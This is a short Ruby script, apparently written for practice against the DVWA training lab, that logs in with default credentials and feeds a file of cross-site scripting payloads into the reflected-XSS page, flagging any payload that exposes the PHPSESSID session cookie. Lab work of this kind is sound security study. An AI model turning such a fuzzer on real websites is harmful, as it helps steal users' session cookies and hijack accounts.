require 'watir'
require 'nokogiri'

browser = Watir::Browser.new :firefox

browser.goto 'http://172.17.0.3/login.php'
browser.input(name:'username').send_keys('admin')
browser.input(name:'password').send_keys('password')
browser.input(name:'Login').click

xss_file = '/root/dvwa/xss2'

File.open(xss_file).readlines.each do |line|
  browser.goto "http://172.17.0.3/vulnerabilities/xss_r/?name="+line
  html = browser.html
  parse = Nokogiri::HTML.parse(html)
  vuln_area = parse.search('//pre').text =~ /PHPSESSID/
  if vuln_area.to_i > 0 
    puts "\nXSS Success!! #{line}\n"
  else
    puts "\nNot Vulnerable!! #{line}\n"
  end
end


